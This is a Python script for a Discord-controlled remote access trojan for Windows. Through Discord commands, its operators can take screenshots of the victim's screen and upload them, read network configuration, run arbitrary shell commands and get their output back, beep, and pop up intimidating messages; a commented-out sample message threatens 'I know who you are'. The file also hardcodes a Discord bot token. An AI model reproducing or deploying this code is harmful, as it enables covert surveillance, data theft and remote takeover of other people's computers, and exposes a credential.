from http import client
import tkinter as tk
from tkinter import *
import discord
from discord.ext import commands
import pyautogui
import time
import subprocess
import os
import winsound


###################################################################
### CONFIG ########################################################
###################################################################

bot = commands.Bot(command_prefix = "!", description = "hey")


###################################################################
### COMMANDS ######################################################
###################################################################




@bot.event
async def on_ready():
    print("ready !") 
    channel = bot.get_channel(994906319586861079) 
    await channel.send("bot online !!")
    await ready()

 
async def ready():
    user = await bot.fetch_user(user_id=620711077197512735)
    await user.send('ready !!!!')

@bot.command()
async def test(ctx):
    await ctx.send("hey !")

@bot.command()
async def text(ctx, *messages):
    msg = " ".join(messages)
    await ctx.send("send to : "+msg)
    print(msg)
    TEXT(msg)

@bot.command()
async def screen(ctx):
    SCREEN()
    time.sleep(1)
    await ctx.send(file=discord.File('screen.jpg'))
    time.sleep(1)
    os.remove("screen.jpg")

@bot.command()
async def ip(ctx):
    ip = subprocess.check_output(["ipconfig"])
    time.sleep(1)
    await ctx.send(ip)

@bot.command()
@commands.is_owner()
async def stop(ctx):
    await ctx.bot.logout()

@bot.command()
async def command(ctx, *commande):
    command = " ".join(commande)
    output = subprocess.check_output([command])
    time.sleep(1)
    await ctx.send(output)

@bot.command()
async def sound(ctx, note, dur):
    winsound.Beep(int(note),int(dur))

###################################################################
### FONCTION CONTROLE #############################################
###################################################################
def TEXT(*messages):
    print("fcn1", messages)
    mess =" ".join(messages)
    print("fcn2", mess)
    mess = mess

    app = tk.Tk()
    app.title(" ")
    app.geometry('900x500')
    app.config( bg = "#131616")
    try:
        app.iconbitmap('image.ico')
    except:
        app.iconbitmap()

    app.resizable(width=False, height=False)

    # TEXT = "Salut Ca va? bon ecoute tu ne sais pas \n qui je suis mais je sais qui tu est ! ☺"
    canvas = Canvas(app, width=800, height=500, background='#131616',highlightthickness=0, relief='ridge' )  
    txt = canvas.create_text(400, 250, text=mess, font="forte 24 bold", fill="#38E4AE")

    canvas.pack()

    app.mainloop()
    mainloop()

def SCREEN():
    screen = pyautogui.screenshot()
    screen.save('screen.jpg')



###################################################################
### TOKEN #########################################################
###################################################################   

bot.run("OTk0OTA1MDA0NzE0NTEyNDU1.GDmBDw.TSJ-pE43CJV-9NK3GHgi2wQA4etkyYMMI4Yzks")

